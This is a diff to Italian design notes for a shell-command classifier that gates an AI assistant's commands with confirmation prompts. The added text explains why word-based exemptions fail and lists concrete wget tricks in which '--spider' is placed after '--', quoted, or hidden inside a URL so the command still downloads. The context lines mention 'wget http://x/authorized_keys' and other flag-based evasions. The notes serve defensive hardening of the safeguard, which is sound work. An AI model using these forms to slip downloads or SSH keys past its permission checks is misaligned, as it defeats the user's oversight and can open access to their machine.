@@ -172,6 +172,20 @@ il livello non viene eseguito.
   che copra le strade che non hai visto: `-P` sceglie la cartella invece del
   nome, `-c`/`-N` accodano o sovrascrivono un file già lì, `-K` prende le opzioni
   da un file. Un check per flag si aggira con un altro flag.
+- **Un'ESENZIONE non si decide leggendo il testo del comando (#479).** Alzare
+  il livello guardando una parola è sicuro (al massimo costa attrito); ABBASSARLO
+  perché una parola compare non lo è mai, perché il classificatore legge un
+  testo mentre il programma legge un `argv` costruito dalla shell, e le due cose
+  divergono ovunque: dopo `--` un'opzione diventa un operando
+  (`wget -N -- <url> --spider` scarica), le virgolette incollano la parola in un
+  argomento che non è un'opzione (`wget "<url>" " --spider "` scarica), e dentro
+  l'URL non è nemmeno un token (`wget "<url>#  --spider "` scarica). Ricostruire
+  "è davvero un'opzione?" vuol dire riprodurre getopt e il quoting — cioè il
+  parsing di shell che `cmdClassify.js` si vieta per principio. Quindi: se la
+  forma esente è rara, TOGLI l'esenzione (una conferma in più su un comando che
+  quasi nessuno usa, e la porta è chiusa per costruzione); se è comune, indirizza
+  l'utente alla forma equivalente già al livello giusto (per la sola verifica di
+  un indirizzo, `curl -I` stampa a schermo e resta 2).
 - **La conferma dice il CONTESTO che nel comando non si legge (#479).** La
   cartella di lavoro dell'assistente è persistente e la sposta lui con un `cd`
   (livello 1: nessuna conferma), quindi `wget http://x/authorized_keys` è
